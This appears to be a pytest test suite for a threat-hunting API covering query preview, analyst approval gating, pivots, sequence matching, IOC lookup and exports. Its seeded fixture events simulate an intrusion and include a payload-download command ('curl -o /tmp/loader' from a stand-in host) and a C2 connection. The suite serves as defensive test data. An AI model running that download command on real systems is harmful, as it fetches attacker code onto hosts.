"""Functional test suite for M7.5 Advanced Threat Hunting & Governed Analyst Queries."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from fastapi import FastAPI

from logintel.api.routes import router
from logintel.hunting.models import (
    AIHuntProposalRequest,
    ApproveHuntRequest,
    ConvertHuntToCollectionRequest,
    ConvertHuntToFindingRequest,
    ConvertHuntToHypothesisEvidenceRequest,
    CreateHuntProposalRequest,
    EntityFilter,
    FieldFilter,
    HuntIntent,
    HuntSequenceProposal,
    HuntSequenceStep,
    QueryOperator,
    TemporalWindow,
)
from logintel.hunting.service import threat_hunting_service
from logintel.storage.case_repo import case_repo
from logintel.storage.db import db


@pytest.fixture
def auth_client():
    from logintel.api.auth import get_current_token
    token = get_current_token()
    app = FastAPI()
    app.include_router(router)
    client = TestClient(app)
    return client, {"Authorization": f"Bearer {token}"}


@pytest.fixture
def m75_case():
    case = case_repo.get_case_by_incident(7501, resolve_evidence=False)
    if not case:
        case = case_repo.create_case(
            incident_id=7501,
            title="M7.5 Threat Hunting Case",
            description="Case for validating threat hunting workflow",
            created_by="SecAnalyst-1",
        )
    return case.case_id


@pytest.fixture(autouse=True)
def seed_test_events():
    """Ensure sample canonical events exist in logintel.db for hunting."""
    with db.connection() as conn:
        conn.execute(
            """
            INSERT OR REPLACE INTO events (
                id, timestamp, ingested_at, source, event_type, severity, host, username,
                process_name, src_ip, dst_ip, action, outcome, summary, raw_message, parser
            ) VALUES
            ('75001', '2026-10-07T10:00:00Z', '2026-10-07T10:00:01Z', 'auth.log', 'authentication', 'HIGH', 'srv-web-01', 'admin', 'sshd', '192.168.1.50', '192.168.1.10', 'login', 'SUCCESS', 'Admin login via SSH', 'Accepted password for admin from 192.168.1.50 port 22', 'openssh'),
            ('75002', '2026-10-07T10:05:00Z', '2026-10-07T10:05:01Z', 'auth.log', 'privilege', 'CRITICAL', 'srv-web-01', 'admin', 'sudo', '192.168.1.50', '192.168.1.10', 'sudo', 'SUCCESS', 'Sudo execution to root', 'admin : TTY=pts/0 ; COMMAND=/bin/bash', 'sudo'),
            ('75003', '2026-10-07T10:08:00Z', '2026-10-07T10:08:01Z', 'auditd', 'process_exec', 'MEDIUM', 'srv-web-01', 'root', 'curl', '192.168.1.50', '198.51.100.22', 'exec', 'SUCCESS', 'Process curl executed', 'curl -o /tmp/loader http://198.51.100.22/payload.bin', 'auditd'),
            ('75004', '2026-10-07T10:15:00Z', '2026-10-07T10:15:01Z', 'network', 'socket_connect', 'HIGH', 'srv-web-01', 'root', 'loader', '192.168.1.50', '203.0.113.88', 'connect', 'SUCCESS', 'Outbound connection to C2', 'loader connect to 203.0.113.88:443', 'network')
            """
        )
        conn.commit()
    yield
    with db.connection() as conn:
        conn.execute("DELETE FROM events WHERE id IN ('75001', '75002', '75003', '75004')")
        conn.commit()


def test_hunt_validation_and_preview(auth_client, m75_case):
    """M75-01, M75-02, M75-04, M75-05: Query builder, preview, and validation."""
    client, headers = auth_client
    case_id = m75_case

    req = {
        "intent": "AUTHENTICATION_ACTIVITY",
        "question": "Identify SSH logins from subnet 192.168.1.0/24",
        "source_types": ["events"],
        "field_filters": [
            {"field": "event_type", "operator": "contains", "value": "auth"},
            {"field": "src_ip", "operator": "prefix", "value": "192.168.1."},
        ],
        "limit": 50,
    }

    res = client.post(f"/api/v1/cases/{case_id}/hunts/preview", json=req, headers=headers)
    assert res.status_code == 200
    data = res.json()
    assert data["case_id"] == case_id
    assert data["intent"] == "AUTHENTICATION_ACTIVITY"
    assert data["validation_status"] == "VALID"
    assert data["filter_count"] == 2
    assert "WHERE" in data["preview_sql_summary"]
    assert data["requires_approval"] is True


def test_hunt_approval_gate_and_execution(auth_client, m75_case):
    """M75-06, M75-07, M75-08, M75-09: Approval gate enforcement and bounded execution."""
    client, headers = auth_client
    case_id = m75_case

    # 1. Create proposal
    create_req = {
        "intent": "PRIVILEGE_ESCALATION",
        "question": "Find sudo executions by admin user",
        "field_filters": [
            {"field": "username", "operator": "equals", "value": "admin"},
            {"field": "action", "operator": "equals", "value": "sudo"},
        ],
        "limit": 10,
    }
    create_res = client.post(f"/api/v1/cases/{case_id}/hunts", json=create_req, headers=headers)
    assert create_res.status_code == 200
    hunt_id = create_res.json()["hunt_id"]
    assert create_res.json()["approval_state"] == "VALIDATED"

    # 2. Attempt execution before approval -> MUST FAIL (HTTP 400)
    exec_fail = client.post(f"/api/v1/cases/{case_id}/hunts/{hunt_id}/execute", headers=headers)
    assert exec_fail.status_code == 400
    assert "requires explicit analyst approval" in exec_fail.json()["detail"].lower()

    # 3. Approve hunt
    app_req = {"approved_by": "SeniorAnalyst", "rationale": "Investigating potential privilege escalation"}
    app_res = client.post(f"/api/v1/cases/{case_id}/hunts/{hunt_id}/approve", json=app_req, headers=headers)
    assert app_res.status_code == 200
    assert app_res.json()["approval_state"] == "APPROVED"

    # 4. Execute approved hunt
    exec_res = client.post(f"/api/v1/cases/{case_id}/hunts/{hunt_id}/execute", headers=headers)
    assert exec_res.status_code == 200
    res_data = exec_res.json()
    assert res_data["status"] == "SUCCESS"
    assert res_data["approval_state"] == "COMPLETED"
    assert res_data["result_count"] >= 1
    assert len(res_data["results"]) >= 1

    first_item = res_data["results"][0]
    assert first_item["source_type"] == "event"
    assert first_item["username"] == "admin"
    assert first_item["epistemic_status"] == "OBSERVED"
    assert "[event:" in first_item["citation_tag"]
    assert first_item["provenance_hash"] != ""
    assert res_data["query_fingerprint"] != ""


def test_entity_pivot_and_temporal_hunt(auth_client, m75_case):
    """M75-12, M75-13: Fast entity-centric pivot and bounded temporal window hunt."""
    client, headers = auth_client
    case_id = m75_case

    # Entity pivot
    ent_res = client.post(
        f"/api/v1/cases/{case_id}/hunts/pivot/entity",
        json={"entity_type": "HOST", "entity_value": "srv-web-01"},
        headers=headers,
    )
    assert ent_res.status_code == 200
    assert ent_res.json()["result_count"] >= 1
    for r in ent_res.json()["results"]:
        assert r["host"] == "srv-web-01"

    # Temporal window hunt around 2026-10-07T10:05:00Z
    temp_res = client.post(
        f"/api/v1/cases/{case_id}/hunts/pivot/temporal",
        json={
            "anchor_timestamp": "2026-10-07T10:05:00Z",
            "window_minutes": 10,
            "direction": "around",
        },
        headers=headers,
    )
    assert temp_res.status_code == 200
    assert temp_res.json()["result_count"] >= 1


def test_sequence_hunt_evaluation(auth_client, m75_case):
    """M75-14: Multi-step sequential attack proposal evaluation with missing step detection."""
    client, headers = auth_client
    case_id = m75_case

    sequence_req = {
        "case_id": case_id,
        "sequence_name": "SSH to Privilege to C2 Outbound",
        "description": "Multi-stage attack pattern: Login -> Sudo -> C2",
        "steps": [
            {
                "step_number": 1,
                "name": "SSH Login",
                "action_type": "login",
                "field_filters": [{"field": "action", "operator": "equals", "value": "login"}],
                "max_time_delta_seconds": 600,
            },
            {
                "step_number": 2,
                "name": "Sudo Escalation",
                "action_type": "sudo",
                "field_filters": [{"field": "action", "operator": "equals", "value": "sudo"}],
                "max_time_delta_seconds": 600,
            },
            {
                "step_number": 3,
                "name": "Unobserved Persistence Step",
                "action_type": "persistence",
                "field_filters": [{"field": "summary", "operator": "contains", "value": "unobserved_cron_job_XYZ"}],
                "max_time_delta_seconds": 600,
            },
        ],
    }

    res = client.post(f"/api/v1/cases/{case_id}/hunts/sequence", json=sequence_req, headers=headers)
    assert res.status_code == 200
    seq_data = res.json()
    assert seq_data["sequence_name"] == "SSH to Privilege to C2 Outbound"
    assert seq_data["matched_steps"] == 2
    assert seq_data["total_steps"] == 3
    assert seq_data["sequence_status"] == "PARTIAL"
    assert 3 in seq_data["missing_telemetry_steps"]


def test_ioc_hunt_and_deterministic_export(auth_client, m75_case):
    """M75-16, M75-18, M75-19: IOC lookup, provenance manifest, and deterministic export."""
    client, headers = auth_client
    case_id = m75_case

    # IOC Hunt for IP 198.51.100.22
    ioc_res = client.post(
        f"/api/v1/cases/{case_id}/hunts/ioc",
        json={"ioc_value": "198.51.100.22"},
        headers=headers,
    )
    assert ioc_res.status_code == 200
    data = ioc_res.json()
    assert data["result_count"] >= 1
    hunt_id = data["hunt_id"]

    # Export JSON
    exp_json = client.get(f"/api/v1/cases/{case_id}/hunts/{hunt_id}/export?format=json", headers=headers)
    assert exp_json.status_code == 200
    json_data = exp_json.json()
    assert json_data["format"] == "json"
    assert json_data["fingerprint"] != ""
    assert "manifest_header" in json_data["export_content"]

    # Export CSV
    exp_csv = client.get(f"/api/v1/cases/{case_id}/hunts/{hunt_id}/export?format=csv", headers=headers)
    assert exp_csv.status_code == 200
    assert "result_id,source_type" in exp_csv.json()["export_content"]


def test_hunt_result_actions_findings_and_collections(auth_client, m75_case):
    """M75-11, M75-21, M75-23: Convert hunt results into findings and collections."""
    client, headers = auth_client
    case_id = m75_case

    # Execute a hunt to get results
    hunt_res = threat_hunting_service.pivot_hunt_by_entity(case_id, "USER", "admin")
    assert hunt_res.result_count >= 1
    target_result_id = hunt_res.results[0].result_id

    # 1. Convert to Finding
    find_req = {
        "hunt_id": hunt_res.hunt_id,
        "title": "Suspicious Admin Session Discovered via Hunt",
        "statement": "Hunt identified admin activity with elevated credentials.",
        "result_ids": [target_result_id],
        "severity": "HIGH",
    }
    find_res = client.post(f"/api/v1/cases/{case_id}/hunts/convert/finding", json=find_req, headers=headers)
    assert find_res.status_code == 200, find_res.text
    assert "FND-" in find_res.json()["finding_id"]
    assert len(find_res.json()["supporting_evidence"]) >= 1

    # 2. Add to Collection (create collection first)
    from logintel.collections.service import workbench_service
    col = workbench_service.create_collection(case_id, "Threat Hunt Findings Collection")

    col_req = {
        "hunt_id": hunt_res.hunt_id,
        "collection_id": col.collection_id,
        "result_ids": [target_result_id],
        "role": "SUPPORTING",
    }
    col_res = client.post(f"/api/v1/cases/{case_id}/hunts/convert/collection", json=col_req, headers=headers)
    assert col_res.status_code == 200
    assert col_res.json()["added_count"] == 1


def test_ai_assisted_hunt_proposal(auth_client, m75_case):
    """M75-20: Advisory AI translation from natural language to structured proposal."""
    client, headers = auth_client
    case_id = m75_case

    ai_req = {
        "natural_language_question": "Show failed SSH logins from IP 192.168.1.50 for user admin",
    }
    res = client.post(f"/api/v1/cases/{case_id}/hunts/ai-assist", json=ai_req, headers=headers)
    assert res.status_code == 200
    proposal = res.json()
    assert proposal["case_id"] == case_id
    assert proposal["intent"] == "AUTHENTICATION_ACTIVITY"
    assert len(proposal["entity_filters"]) >= 1
